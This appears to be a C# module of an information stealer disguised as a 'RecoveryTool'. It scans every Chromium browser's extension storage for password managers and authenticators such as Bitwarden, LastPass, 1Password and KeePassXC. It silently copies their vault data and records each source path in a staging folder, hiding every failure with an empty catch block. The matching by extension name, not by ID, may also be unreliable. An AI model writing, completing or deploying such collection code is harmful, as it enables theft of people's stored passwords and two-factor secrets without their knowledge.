using RecoveryTool.Recovery.Browsers.Chromium;
using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Other
{
    public class BrowserPasswordManagerService
    {
        private static readonly Dictionary<string, string> _passwordManagerDirectories = new(StringComparer.OrdinalIgnoreCase)
        {
            { "bitwarden", "bitwarden" },
            { "dashlane", "dashlane" },
            { "1password", "onepassword" },
            { "lastpass", "lastpass" },
            { "keeper", "keeper" },
            { "authenticator", "authenticator" },
            { "nordpass", "nordpass" },
            { "roboform", "roboform" },
            { "multipassword", "multipassword" },
            { "keepassxc", "keepassxc" },
        };

        public static async Task SaveBrowserPasswordManagerAsync()
        {
            string localExtensionsSettingsDir = "Local Extension Settings";

            foreach (var (browserName, browserDir) in ChromiumCommon.BrowserDirectories)
            {
                string browserPath = Path.Combine(Common.LocalData, browserDir, localExtensionsSettingsDir);

                if (!Directory.Exists(browserPath))
                    continue;

                foreach (var (passwordManagerKey, passwordManagerName) in _passwordManagerDirectories)
                {
                    string extensionPath = Path.Combine(browserPath, passwordManagerKey);

                    if (Directory.Exists(extensionPath) && Directory.EnumerateFileSystemEntries(extensionPath).Any())
                    {
                        await CopyPasswordManagerDataAsync(browserName, passwordManagerName, extensionPath);
                    }
                }
            }
        }

        private static async Task CopyPasswordManagerDataAsync(string browserName, string passwordManagerName, string extensionPath)
        {
            try
            {
                string passwordManagerBrowser = $"{passwordManagerName} ({browserName})";
                string passwordDirPath = Path.Combine(Common.EnsurePasswordManagerPath(), passwordManagerBrowser);

                await Task.Run(() => CopyDirectory(extensionPath, passwordDirPath));

                string locationFile = Path.Combine(passwordDirPath, "Location.txt");
                await File.WriteAllTextAsync(locationFile, extensionPath);
            }
            catch { }
        }

        private static void CopyDirectory(string sourceDir, string destinationDir)
        {
            foreach (string dirPath in Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories))
            {
                string newDir = dirPath.Replace(sourceDir, destinationDir);
                Directory.CreateDirectory(newDir);
            }

            foreach (string filePath in Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories))
            {
                string newFilePath = filePath.Replace(sourceDir, destinationDir);
                File.Copy(filePath, newFilePath, true);
            }
        }
    }
}